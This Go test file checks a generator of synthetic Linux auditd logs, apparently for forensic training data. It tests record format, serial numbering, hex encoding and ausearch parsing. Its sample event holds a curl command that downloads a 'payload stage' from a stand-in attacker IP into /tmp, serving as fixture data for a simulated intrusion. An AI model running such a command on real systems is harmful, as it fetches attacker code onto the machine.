package libgen

import (
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/aoiflux/fsagen/prng"
)

func sampleAuditLog() AuditLog {
	t := time.Date(2024, 3, 15, 9, 10, 0, 250_000_000, time.UTC)
	login := AuditEvent{User: "user1", UID: 1000, AUID: 1000, Session: 3, PID: 2200, Exe: "/usr/sbin/sshd", Host: "203.0.113.7", Addr: "203.0.113.7", Success: true}
	auth, logged, start := login, login, login
	auth.Kind, auth.Time, auth.Terminal = "auth", t, "ssh"
	logged.Kind, logged.Time, logged.Terminal = "login", t.Add(time.Second), "/dev/pts/0"
	start.Kind, start.Time, start.Terminal = "session_start", t.Add(2*time.Second), "ssh"
	return AuditLog{FirstSerial: 4520, Events: []AuditEvent{
		auth, logged, start,
		{Kind: "execve", Time: t.Add(time.Minute), User: "user1", UID: 1000, AUID: 1000, Session: 3, PID: 2301, PPID: 2240,
			Exe: "/usr/bin/curl", Argv: []string{"curl", "-o", "/tmp/x", "http://198.51.100.42/payload stage"}, Cwd: "/home/user1", Key: "exec", TTY: "pts0", Success: true},
	}}
}

var reAuditLine = regexp.MustCompile(`^type=(\w+) msg=audit\((\d+)\.(\d{3}):(\d+)\): (.*)$`)

// TestAuditLogLines: every line is a record in auditd's raw format; the
// records of one event share its time and serial, serials rise from one
// event to the next, and a string with a space or a quote is the hex
// ausearch decodes, as the kernel writes it.
func TestAuditLogLines(t *testing.T) {
	log := sampleAuditLog()
	data, err := BuildAuditLog(log, prng.Root(1).Stream())
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSuffix(string(data), "\n"), "\n")
	var types []string
	serials := map[string]string{}
	last := uint64(0)
	for _, l := range lines {
		m := reAuditLine.FindStringSubmatch(l)
		if m == nil {
			t.Fatalf("not an audit record: %q", l)
		}
		types = append(types, m[1])
		serial, _ := strconv.ParseUint(m[4], 10, 64)
		if serial < last {
			t.Errorf("serial %d after %d", serial, last)
		}
		last = serial
		serials[m[1]] = m[2] + "." + m[3] + ":" + m[4]
	}
	if want := "USER_AUTH USER_LOGIN USER_START SYSCALL EXECVE CWD PATH PATH PROCTITLE"; strings.Join(types, " ") != want {
		t.Errorf("records %v, want %s", types, want)
	}
	if !strings.HasPrefix(lines[0], "type=USER_AUTH msg=audit(1710493800.250:4520):") {
		t.Errorf("first record %q", lines[0])
	}
	for _, typ := range []string{"EXECVE", "CWD", "PATH", "PROCTITLE"} {
		if serials[typ] != serials["SYSCALL"] {
			t.Errorf("%s is stamped %s, SYSCALL %s", typ, serials[typ], serials["SYSCALL"])
		}
	}
	execve := lines[4]
	arg := regexp.MustCompile(`a3=(\S+)`).FindStringSubmatch(execve)
	if arg == nil {
		t.Fatalf("no a3 in %q", execve)
	}
	if b, err := hex.DecodeString(arg[1]); err != nil || string(b) != "http://198.51.100.42/payload stage" {
		t.Errorf("a3 is %q, want the argument with a space as hex", arg[1])
	}
	if !strings.Contains(execve, `a1="-o"`) || !strings.Contains(lines[3], `key="exec"`) || !strings.Contains(lines[3], `comm="curl" exe="/usr/bin/curl"`) {
		t.Errorf("records\n%s\n%s", lines[3], execve)
	}
	title := strings.TrimPrefix(regexp.MustCompile(`proctitle=(\S+)`).FindString(lines[8]), "proctitle=")
	if b, _ := hex.DecodeString(title); string(b) != strings.Join(log.Events[3].Argv, "\x00") {
		t.Errorf("proctitle %q", title)
	}
	if !strings.Contains(lines[0], `acct="user1" exe="/usr/sbin/sshd" hostname=203.0.113.7 addr=203.0.113.7 terminal=ssh res=success'`) {
		t.Errorf("USER_AUTH %q", lines[0])
	}
}

// TestAuditLogReadByAusearch: ausearch, where installed, reads the log as
// auditd's own: it finds the execution by its rule key and the logins by
// user, and interprets the hex argument back to text.
func TestAuditLogReadByAusearch(t *testing.T) {
	ausearch, err := exec.LookPath("ausearch")
	if err != nil {
		t.Skip("ausearch is not installed")
	}
	data, err := BuildAuditLog(sampleAuditLog(), prng.Root(1).Stream())
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "audit.log")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	out, err := exec.Command(ausearch, "-if", path, "-k", "exec", "-i").CombinedOutput()
	if err != nil {
		t.Fatalf("ausearch -k exec: %v\n%s", err, out)
	}
	if !strings.Contains(string(out), "payload stage") || !strings.Contains(string(out), "type=EXECVE") {
		t.Errorf("ausearch -k exec found:\n%s", out)
	}
	out, err = exec.Command(ausearch, "-if", path, "-m", "USER_LOGIN", "-sv", "yes").CombinedOutput()
	if err != nil || !strings.Contains(string(out), "op=login") {
		t.Errorf("ausearch -m USER_LOGIN: %v\n%s", err, out)
	}
}
